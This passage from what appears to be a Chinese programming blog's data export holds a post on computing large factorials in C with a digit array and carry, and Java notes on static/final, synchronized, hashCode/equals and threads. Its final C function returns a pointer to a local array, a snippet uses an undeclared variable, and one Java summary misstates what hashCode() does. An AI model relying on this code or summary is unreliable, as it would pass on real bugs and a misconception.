&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>大概代码就是这些，代码本身不难看懂，只是这个实现的方法是我没有想过的。这个算法设计很巧，所以有必要记录一下</strong></p>\n<p><strong>代码翻译成计算过程如下，举个乘积例子：1213 * 325，自己动手计算一下，我的老实计算步骤是这样的：</strong></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">    1213</span><br><span class=\"line\"> *   325</span><br><span class=\"line\">------------</span><br><span class=\"line\">    6065</span><br><span class=\"line\">   2426</span><br><span class=\"line\">  3639</span><br><span class=\"line\">------------</span><br><span class=\"line\">  394225</span><br></pre></td></tr></table></figure>\n<p><strong>那么代码怎么实现这两个数的计算的呢？首先用5 <em> 1213 然后将最后一位的5落下来，将剩下的 606 加在第二次用 2 </em> 1213 的结果上，再将6落下来，同样的道理一直到计算完。这是从计算本身的角度去设计代码，简单易懂，也便于设计代码，那么再大的数也可以实现阶乘计算了，所以最后完成的代码如下：</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//本程序有待完善</span><br><span class=\"line\"><span class=\"comment\"># include &lt;stdio.h&gt;</span></span><br><span class=\"line\"><span class=\"comment\"># include &lt;stdlib.h&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">int * JieCheng (int );</span><br><span class=\"line\">/*计算大数阶乘</span><br><span class=\"line\"> *输出为数组（指针）</span><br><span class=\"line\"> *断点为f[i] = 10,使用该函数时可定义一个指针指向该函数返回值，</span><br><span class=\"line\"> *如函数返回值：5370923 10，最后10为断点</span><br><span class=\"line\"> *注：该函数灵活度很差，有待改善</span><br><span class=\"line\"> */</span><br><span class=\"line\">int <span class=\"function\"><span class=\"title\">main</span></span> ()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tint number = 0;</span><br><span class=\"line\">\tint * g;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">while</span> (1)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"Please input a integer no more than 1000\\n\"</span>);</span><br><span class=\"line\">\t\tscanf(<span class=\"string\">\"%d\"</span>, &amp;number);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"The result is:\"</span>);</span><br><span class=\"line\">\t\tg = JieCheng(number);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> (;(*g)!=10;g++)      <span class=\"built_in\">printf</span>(<span class=\"string\">\"%d\"</span>,*g);</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"\\n\"</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tsystem(<span class=\"string\">\"pause\"</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">return</span> 0;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">int * JieCheng (int number)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tint f[3000] = &#123;0&#125;;       //待完善</span><br><span class=\"line\">\tint i, j;</span><br><span class=\"line\"></span><br><span class=\"line\">\tf[0] = 1;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (i=1;i&lt;=number;i++)            //迭代求阶乘，从1到所求数</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tint left = 0;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> (j=0;j&lt;3000;j++)           //数组表示所求阶乘大数的每一分数位，如个位是f[0],十位是f[1]</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tint sum = f[j] * i + left;        //具体求法在博客上</span><br><span class=\"line\">\t\t\tf[j] = sum % 10;</span><br><span class=\"line\">\t\t\tleft = sum / 10;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (i=3000-1;;i--)    <span class=\"keyword\">if</span> (f[i]!=0)   <span class=\"built_in\">break</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (j=0;j&lt;i/2+1;j++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tint a = 0;</span><br><span class=\"line\">\t\ta = f[j];               //将数组倒置</span><br><span class=\"line\">\t\tf[j] = f[i-j];</span><br><span class=\"line\">\t\tf[i-j] = a;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tf[i+1] = 10;        //设置断点，使用时以此终止输出 </span><br><span class=\"line\">\t<span class=\"built_in\">return</span> f;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n","excerpt":"<p><strong>最近遇到了一个编程上的小问题，编程题目是这样的，计算一个数的阶乘，我当时就在想，这不是很简单吗，然后我随手写了串代码，如下</strong></p>","more":"<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">double Jie_Cheng(int i)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tdouble the_output_number = 1;</span><br><span class=\"line\">\tint j = 1;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (j=1;j&lt;=i;j++)    the_output_number *= j;</span><br><span class=\"line\">\t<span class=\"built_in\">return</span> the_output_number;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>但是有人提醒我这串代码在有些编译器中只能算1-13的阶乘，我就意思到这样的代码会有溢出数据范围，然后自己想了些法子去实现，然后又去网上找别人写的代码，看了一些不太好的代码，代码多又复杂，所以没兴趣看，然后突然找到了如下代码，我认真地看着</strong></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">const int max = 3000;</span><br><span class=\"line\">int f[max] = &#123;0&#125;;</span><br><span class=\"line\">int <span class=\"function\"><span class=\"title\">main</span></span> ()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tint i, j, number;</span><br><span class=\"line\">    scanf(<span class=\"string\">\"%d\"</span>,&amp;number);</span><br><span class=\"line\">    </span><br><span class=\"line\">    f[0] = 1;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (i=2;i&lt;=n;i++)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">    \tint left = 0;                   //下面要用的余数</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (j=0;j&lt;max;j++)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">        \tint sum = f[j] * i + left;</span><br><span class=\"line\">            //一个数乘以另一个数的每一项</span><br><span class=\"line\">            f[j] = sum % 10;</span><br><span class=\"line\">            left = sum / 10;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>大概代码就是这些，代码本身不难看懂，只是这个实现的方法是我没有想过的。这个算法设计很巧，所以有必要记录一下</strong></p>\n<p><strong>代码翻译成计算过程如下，举个乘积例子：1213 * 325，自己动手计算一下，我的老实计算步骤是这样的：</strong></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">    1213</span><br><span class=\"line\"> *   325</span><br><span class=\"line\">------------</span><br><span class=\"line\">    6065</span><br><span class=\"line\">   2426</span><br><span class=\"line\">  3639</span><br><span class=\"line\">------------</span><br><span class=\"line\">  394225</span><br></pre></td></tr></table></figure>\n<p><strong>那么代码怎么实现这两个数的计算的呢？首先用5 <em> 1213 然后将最后一位的5落下来，将剩下的 606 加在第二次用 2 </em> 1213 的结果上，再将6落下来，同样的道理一直到计算完。这是从计算本身的角度去设计代码，简单易懂，也便于设计代码，那么再大的数也可以实现阶乘计算了，所以最后完成的代码如下：</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//本程序有待完善</span><br><span class=\"line\"><span class=\"comment\"># include &lt;stdio.h&gt;</span></span><br><span class=\"line\"><span class=\"comment\"># include &lt;stdlib.h&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">int * JieCheng (int );</span><br><span class=\"line\">/*计算大数阶乘</span><br><span class=\"line\"> *输出为数组（指针）</span><br><span class=\"line\"> *断点为f[i] = 10,使用该函数时可定义一个指针指向该函数返回值，</span><br><span class=\"line\"> *如函数返回值：5370923 10，最后10为断点</span><br><span class=\"line\"> *注：该函数灵活度很差，有待改善</span><br><span class=\"line\"> */</span><br><span class=\"line\">int <span class=\"function\"><span class=\"title\">main</span></span> ()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tint number = 0;</span><br><span class=\"line\">\tint * g;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">while</span> (1)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"Please input a integer no more than 1000\\n\"</span>);</span><br><span class=\"line\">\t\tscanf(<span class=\"string\">\"%d\"</span>, &amp;number);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"The result is:\"</span>);</span><br><span class=\"line\">\t\tg = JieCheng(number);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> (;(*g)!=10;g++)      <span class=\"built_in\">printf</span>(<span class=\"string\">\"%d\"</span>,*g);</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"\\n\"</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tsystem(<span class=\"string\">\"pause\"</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">return</span> 0;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">int * JieCheng (int number)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tint f[3000] = &#123;0&#125;;       //待完善</span><br><span class=\"line\">\tint i, j;</span><br><span class=\"line\"></span><br><span class=\"line\">\tf[0] = 1;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (i=1;i&lt;=number;i++)            //迭代求阶乘，从1到所求数</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tint left = 0;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> (j=0;j&lt;3000;j++)           //数组表示所求阶乘大数的每一分数位，如个位是f[0],十位是f[1]</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tint sum = f[j] * i + left;        //具体求法在博客上</span><br><span class=\"line\">\t\t\tf[j] = sum % 10;</span><br><span class=\"line\">\t\t\tleft = sum / 10;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (i=3000-1;;i--)    <span class=\"keyword\">if</span> (f[i]!=0)   <span class=\"built_in\">break</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (j=0;j&lt;i/2+1;j++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tint a = 0;</span><br><span class=\"line\">\t\ta = f[j];               //将数组倒置</span><br><span class=\"line\">\t\tf[j] = f[i-j];</span><br><span class=\"line\">\t\tf[i-j] = a;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tf[i+1] = 10;        //设置断点，使用时以此终止输出 </span><br><span class=\"line\">\t<span class=\"built_in\">return</span> f;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>"},{"title":"Java 基础小记","date":"2018-03-01T07:18:23.000Z","_content":"\n## static和final的区别和用途\n- Static\n\t- 修饰变量:静态变量随着类的加载时完成初始化，内存中只有一个，且JVM也只会为他分配一次内存，所有类共享静态变量，静态变量放在指定的静态共享区，遵循一改全改。\n\t- 修饰方法:静态方法在类加载时就存在与静态区域，不依赖任何实例，Static方法必须实现，不能是抽象类abstract。使用静态方法时可以直接使用`类名.方法名`,不需要实例化一个对象。\n\t- 修饰代码块：类加载完后执行代码块中的内容。\n\n- Final\n\t- 修饰变量：\n\t\t- 编译时常量：类加载的过程完成初始化，编译后带入到任何计算式中，只能是基本类型。\n\t\t- 运行时常量：基本数据类型或引用数据类型，引用不可变，但引用的内容可以变。\n\t- 修饰方法：跟final单词意思相近，最后的方法，表示不能被继承，不能被子类修改重写。\n\t- 修饰类：不能被继承。\n\t- 修饰形参：final形参在方法内不可变。\n\n<!-- more -->\n\n``` java\nclass Value {\n    int i = 1;\n}\n\npublic class FinalDemo {\n\n    static int i = 9;\n    final int i1 = 9;\n    static final int i2 = 29;\n    public static final int i3 = 39;\n    final int i4 = (int)(Math.random()*20);\n    static final int i5 = (int)(Math.random()*20);\n\n    Value v1 = new Value();\n    final Value v2 = new Value();\n    static final Value v3 = new Value();\n\t// final Value v4;\t// Error: var not init in the default constructor\n    final int[] a = {1, 2, 3, 4, 5, 6 };\n\n    public void print(String id) {\n        System.out.println(id + \" : \" + \"i4 = \" + i4 + \", i5 = \" + i5 + \", i = \" + i);\n    }\n\n    public static void main(String[] args) {\n        FinalDemo finalDemo = new FinalDemo();\n        // finalDemo.i1++;  // Error: can't change value\n        finalDemo.v2.i++;\n\t\tFinalDemo.i++;\n\t\tfinalDemo.v1 = new Value();\n\t\tfor (int i = 0; i < finalDemo.a.length; i++) {\n\t\t\tfinalDemo.a[i]++;\n\t\t\t// finalDemo.v2 = new Value();\t// Error: Can't\n\t\t\t// finalDemo.v3 = new Value();\t// change handle\n\t\t\t// finalDemo.a = new int[3];\t// Error: can't assign a value to final var\n\t\t}\n\n\t\tfinalDemo.print(\"fd1\");\n\t\tSystem.out.println(\"Creating new FinalDemo class\");\n\t\tFinalDemo finalDemo2 = new FinalDemo();\n\t\tfinalDemo.print(\"fd1\");\n\t\tfinalDemo2.print(\"fd2\");\n    }\n}\n```\n\n## 同步机制实现原子化 synchronized\n丢失更新(lost update) 有一种特定的过程。\n(1) 取得账户余额。\n`int i = balance;`\n(2) 将账户余额加1。\n`balance = i + 1;`\n这会让计算机以两个步骤来完成账户的变化。通常我们会以单一的命令来做这件事情:\n`balance++;`\n但强行以两个步骤来处理就会浮现出非原子性的问题。下面用两个都想把余额递增的线程来展示丢失更新。\n``` java\nclass TestSync implements Runnable {\n\n    private int balance;\n\n    /** 每个线程都把账户递增50次　**/\n\n    @Override\n    public void run() {\n        for(int i = 0; i < 50; i++) {\n            increament();\n            System.out.println(\"balance is \" + balance);\n        }\n    }\n\n    private void increament() {\n        int i = balance;\n        /** 问题出在我们用的是读取的值而不是目前的值 **/\n        balance = i + 1;\n    }\n}\n\npublic class TestSyncTest {\n\n    public static void main(String[] args) {\n        TestSync job = new TestSync();\n        Thread a = new Thread(job);\n        Thread b = new Thread(job);\n        a.start();\n        b.start();\n    }\n}\n```\n\n用同步机制让`increment()` 方法原子化，将`increment()`方法同步化可以解决丢失更新的问题，因为他会让方法中的两个步骤组成不可分割的单元。\n``` java\nprivate synchronized void increment() {\n    int i = balance;\n    balance = i + 1;\n}\n```\n但同步化是需要付出额外的成本。也就是说进入同步化方法的程序会查询钥匙等性能上的损耗。其次，同步化的方法会让你的程序因为要同步并行的问题而慢下来。同步化会强制线程排队等待执行方法。最后，最可怕的是同步化可能会导致死锁现象。原则上最好制作最少量的同步化。事实上同步化的规模可以小于方法全部，可以用`synchronized`来修饰一行或数行的代码而不必整个方法都同步化。比如:\n``` java\npublic void go() {\n    doStuff();\n\n    synchronized(this) {\n        criticalStuff();\n        moreCriticalStuff();\n    }\n}\n```\n\n并行问题也是线程安全的问题，对于一个类是否线程安全，重要的决定因素便是是否存在上面提及的问题，诸如HashMap和HashTable、StringBuffer和StringBuiler、Vector和ArrayList等的区别，其中HashMap、StringBuiler、ArrayList没有实现同步化，因此是非线程安全的；HashTable、StringBuffer、Vector在原本HashMap、StringBuiler、ArrayList的方法上添加了`synchronized`修饰来保证线程安全。\n\n## hashCode()与equals()的相关规定\nAPI文件有对对象的状态指定出必须遵守的规则：\n1. 如果两个对象相等，则`hashcode`必须也是相等的。\n2. 如果两个对象相等，对其中一个对象调用`equals()`必须返回`true`。也就是说，若`a.equals(b)`则`b.equals(a)`。\n3. 如果两个对象有相同的`hashcode`值，它们也不一定是相等的。但若两个对象相等，则`hashcode`值一定是相等的。\n4. 因此若`equals()`被覆盖过，则`hashCode()`也必须被覆盖。\n5. `hashCode()`的默认行为是对在`heap(堆)`上的对象产生独特的值。如果你没有`override`过`hashCode()`，则该`class`的两个对象怎样都不会被认为是相同的。\n6. `equals()`的默认行为是执行==的比较。也就是说会去测试两个引用是否对上`heap`上同一个对象。如果`equals()`没有被覆盖过，两个对象永远都不会被视为相同的，因为不同的对象有不同的字节组合。\n\n`a.equals(b)`必须与`a.hashCode() == b.hashCode()`等值。但`a.hashCode() == b.hashCode()`不一定要与`a.equals()`等值。\n\n**问：**为什么不同对象会有相同`hashcode`的可能\n**答：**`HashSet`使用`hashcode`来达成存取速度较快的存储方法。如果你尝试用对象来寻找`ArrayList`中相同的对象(也就是不用索引来找)，`ArrayList`会从头开始找起。但是`HashSet`这样找对象的速度就块多了，因为它使用`hashcode`来寻找符合条件的元素。因此当你想要寻找某个对象时，通过`hashcode`就可以很快算出该对象所在的位置，而不用从头一个一个找起。重点在于`hashcode`相同并不一定保证对象是相等的，因为`hashCode()`所使用的杂凑算法也许刚刚好会让多个对象传回相同的杂凑值。越糟糕的杂凑算法越容易碰撞，但这也与数据值域分布的特征有关。如果`HashSet`发现在对比的时候，同样的`hashcode`有多个对象，它会使用`equals()`来判断是否有完全的符合。也就是说，`hashcode`是用来缩小寻找成本，但最后还是要用`equals()`才能认定是否真的找到相同的项目。\n\n> 这与加密中的问题一样，网络中将用户的密码获取后，通过加密算法将密码加密成一个固定长度的无规律字符串保存在数据库中，密码相同，肯定加密的结果是唯一相同的，但是由于加密过后是固定长度，比如32个字节，那么着32个字节就有固定的容量，因此会出现两个不同的密码加密后是一样的字符串。\n\n对于上述第四条和第五条，个人的理解是：`hashCode()`方法原本是根据对象在内存中的位置来计算，因此如果要比较两个对象是否相等，通过原本的`hashCode()`方法计算会得到两个不同的值，因为是两个对象，原本的`hashCode()`是一个对象对应一个唯一的值，这个值与内存位置有关，而两个对象是在不同的内存位置上，如果强行想要表示这两个对象相等，就必须重写原本的`hashCode()`。\n\n同样的，对于`equals()`方法，原本是表示两个引用所指向的对象是否是一个对象，但是我们需要按照自己的意愿去表示两个不同的对象，如果某些特征相同时也表示相等，比如想要表示一个人的信息，在不同时间点记录的信息会不同，但只要身份证号一样，我们就认为这是同一个人。这就需要重写`equals()`方法，让它表示两个不同对象在意义上相同。\n\n综合上述的描述 : `hashCode()`是判断引用相等，`equals()`是判断对象相等。\n\n## Collection API\n![](http://wiki3.cosc.canterbury.ac.nz/images/8/8d/Collections-detail-1.png)\n\n## 多线程\n### [Java实现多线程的方式](http://fenlan.github.io/2016/06/18/java-Thread/)\n- 继承`Thread`类，重写`run`方法\n- 实现`Runable`接口\n- 实现`Callable`接口\n\n> 启动多线程时，`start()`方法的调用后并不是立即执行多线程代码，而是使得该线程变为可运行态（Runnable），什么时候运行是由操作系统决定的。\n> 从程序运行的结果可以发现，多线程程序是乱序执行。因此，只有乱序执行的代码才有必要设计为多线程。\n> Thread.sleep()方法调用目的是不让当前线程独自霸占该进程所获取的CPU资源，以留出一定时间给其他线程执行的机会。\n> 实际上所有的多线程代码执行顺序都是不确定的，每次执行的结果都是随机的。\n\n> 实际上所有的多线程代码都是通过运行Thread的start()方法来运行的。因此，不管是扩展Thread类还是实现Runnable接口来实现多线程，最终还是通过Thread的对象的API来控制线程的。\n\n### 三种方式的区别\n- 实现`Runable`接口能增强程序的健壮性，代码能够被多个线程共享，**代码与数据是独立的**，适合多个相同程序代码的线程区处理同一资源。正如上述同步化所用的程序。\n- 继承`Thread`类不适合资源共享，但继承`Thread`和实现`Runable`都是通过`start()`启动线程，然后JVM将线程放到就绪队列中，如果有处理机可用，则执行`run`方法。\n- 实现`Callable`接口要实现`call`方法，并且线程执行完后是后返回值的，其他两种都没有返回值。\n\n> 在java中，每次程序运行至少启动2个线程。一个是main线程，一个是垃圾收集线程。\n\n### 线程状态\n![](http://img.blog.csdn.net/20150309140927553)\n- 新建状态（New）：新创建了一个线程对象。\n- 就绪状态（Runnable）：线程对象创建后，其他线程调用了该对象的start()方法。该状态的线程位于可运行线程池中，变得可运行，等待获取CPU的使用权。\n- 运行状态（Running）：就绪状态的线程获取了CPU，执行程序代码\n- 阻塞状态（Blocked）：阻塞状态是线程因为某种原因放弃CPU使用权，暂时停止运行。直到线程进入就绪状态，才有机会转到运行状态。阻塞的情况分三种：\n\t- 等待阻塞：运行的线程执行wait()方法，JVM会把该线程放入等待池中。(wait会释放持有的锁)\n\t- 同步阻塞：运行的线程在获取对象的同步锁时，若该同步锁被别的线程占用，则JVM会把该线程放入锁池中。\n\t- 其他阻塞：运行的线程执行sleep()或join()方法，或者发出了I/O请求时，JVM会把该线程置为阻塞状态。当sleep()状态超时、join()等待线程终止或者超时、或者I/O处理完毕时，线程重新转入就绪状态。（注意,sleep是不会释放持有的锁）\n- 死亡状态（Dead）：线程执行完了或者因异常退出了run()方法，该线程结束生命周期。\n\n### 线程调度\n**Java线程有优先级，优先级高的线程会获得较多的运行机会。**\n\nJava线程的优先级用整数表示，取值范围是1~10，Thread类有以下三个静态常量：\n``` java\nstatic int MAX_PRIORITY\n          线程可以具有的最高优先级，取值为10。\nstatic int MIN_PRIORITY\n          线程可以具有的最低优先级，取值为1。\nstatic int NORM_PRIORITY\n          分配给线程的默认优先级，取值为5。\n```\n\n> Thread类的setPriority()和getPriority()方法分别用来设置和获取线程的优先级。\n> 每个线程都有默认的优先级。主线程的默认优先级为Thread.NORM_PRIORITY。\n> 线程的优先级有继承关系，比如A线程中创建了B线程，那么B将和A具有相同的优先级。\n\n### 常用的调度\n- 线程睡眠：Thread.sleep(long millis)方法，使线程转到阻塞状态。millis参数设定睡眠的时间，以毫秒为单位。当睡眠结束后，就转为就绪（Runnable）状态。sleep()平台移植性好。sleep不会释放持有的锁。\n- 线程等待：Object类中的wait()方法，导致当前的线程等待，直到其他线程调用此对象的 notify() 方法或 notifyAll() 唤醒方法。这两个唤醒方法也是Object类中的方法，行为等价于调用 wait(0) 一样。wait会释放持有的锁。\n- 线程让步：Thread.yield() 方法，暂停当前正在执行的线程对象，把执行机会让给相同或者更高优先级的线程。\n- 线程加入：join()方法，等待其他线程终止。在当前线程中调用另一个线程的join()方法，则当前线程转入阻塞状态，直到另一个进程运行结束，当前线程再由阻塞转为就绪状态。\n- 线程唤醒：Object类中的notify()方法，唤醒在此对象监视器上等待的单个线程。如果所有线程都在此对象上等待，则会选择唤醒其中一个线程。选择是任意性的，并在对实现做出决定时发生。线程通过调用其中一个 wait 方法，在对象的监视器上等待。 直到当前的线程放弃此对象上的锁定，才能继续执行被唤醒的线程。被唤醒的线程将以常规方式与在该对象上主动同步的其他所有线程进行竞争；例如，唤醒的线程在作为锁定此对象的下一个线程方面没有可靠的特权或劣势。类似的方法还有一个notifyAll()，唤醒在此对象监视器上等待的所有线程。\n\n### 常用函数说明\n- `sleep(long millis)` : `运行`-->`阻塞` ,在指定的毫秒数内让当前正在执行的线程休眠（暂停执行）\n- `join()` : `运行`-->`阻塞`,在很多情况下，主线程生成并起动了子线程，如果子线程里要进行大量的耗时的运算，主线程往往将于子线程之前结束，但是如果主线程处理完其他的事务后，需要用到子线程的处理结果，也就是主线程需要等待子线程执行完成之后再结束，这个时候就要用到join()方法了。\n- `yield()` : `运行`-->`可运行`,让当前运行线程回到可运行状态，以允许具有相同优先级的其他线程获得运行机会。因此，使用yield()的目的是让相同优先级的线程之间能适当的轮转执行。但是，实际中无法保证yield()达到让步目的，因为让步的线程还有可能被线程调度程序再次选中。\n- `wait()` : `Obj.wait()`，与`Obj.notify()`必须要与`synchronized(Obj)`一起使用，也就是wait,与notify是针对已经获取了Obj锁进行操作，从语法角度来说就是Obj.wait(),Obj.notify必须在synchronized(Obj){...}语句块内。从功能上来说wait就是说线程在获取对象锁后，主动释放对象锁，同时本线程休眠。直到有其它线程调用对象的notify()唤醒该线程，才能继续获取对象锁，并继续执行。相应的notify()就是对对象锁的唤醒操作。但有一点需要注意的是notify()调用后，并不是马上就释放对象锁的，而是在相应的synchronized(){}语句块执行结束，自动释放锁后，JVM会在wait()对象锁的线程中随机选取一线程，赋予其对象锁，唤醒线程，继续执行。这样就提供了在线程间同步、唤醒的操作。Thread.sleep()与Object.wait()二者都可以暂停当前线程，释放CPU控制权，主要的区别在于Object.wait()在释放CPU同时，释放了对象锁的控制\n\n### `wait()`和`notify()`\n- wait() 与 notify/notifyAll() 